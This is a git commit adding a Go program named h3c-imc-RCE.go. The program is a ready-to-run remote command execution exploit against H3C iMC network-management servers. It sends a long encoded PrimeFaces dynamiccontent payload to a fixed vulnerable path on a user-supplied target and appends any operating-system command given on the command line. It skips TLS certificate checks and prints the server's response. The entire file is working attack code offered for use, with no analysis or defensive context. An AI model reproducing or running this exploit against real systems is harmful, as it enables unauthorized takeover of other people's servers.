76714b75cd4ecbe561bf9b0ada0d7fba817760b1
any3ite <any3ite@t00ls.net>
2021-05-28 12:55:32 +0800

    first commit

---
+++ h3c-imc-RCE.go
@@ -0,0 +1,61 @@
+package main
+
+import (
+	"compress/gzip"
+	"crypto/tls"
+	"flag"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"runtime"
+	"strings"
+)
+
+func main() {
+	defer func() {
+		err := recover()
+		switch err.(type) {
+		case runtime.Error:
+			fmt.Println("[X]---> 运行时错误！\t命令执行失败！")
+		default:
+			fmt.Println("[X]---> 未知错误！\t请检查源代码！")
+		}
+	}()
+
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: tr}
+	var targetURL string
+	var execedCMD string
+	vulPath := `/imc/javax.faces.resource/dynamiccontent.properties.xhtml`
+	payload := `pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=`
+	useragent := `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36`
+	flag.StringVar(&targetURL, "u", "", "域名或IP地址")
+	flag.StringVar(&execedCMD, "e", "", "操作系统命令")
+	flag.Parse()
+	request, err := http.NewRequest(http.MethodPost, targetURL+vulPath, strings.NewReader(payload+execedCMD))
+	chkerr(err)
+	request.Header.Add("Pragma", "no-cache")
+	request.Header.Add("Cache-Control", "no-cache")
+	request.Header.Add("User-Agent", string(useragent))
+	request.Header.Add("Accept", "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8")
+	request.Header.Add("Referer", targetURL+"/imc/login.jsf")
+	request.Header.Add("Accept-Encoding", "gzip, deflate")
+	request.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
+	request.Header.Add("Connection", "close")
+	request.Header.Add("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8")
+	request.Header.Add("Content-Length", string(len(payload+execedCMD)))
+
+	do, _ := client.Do(request)
+	defer func() {
+		_ = do.Body.Close()
+	}()
+	gread, _ := gzip.NewReader(do.Body)
+	ioread, err := ioutil.ReadAll(gread)
+	fmt.Printf("%s\n", ioread)
+}
+
+func chkerr(e error) {
+	_ = e
+}
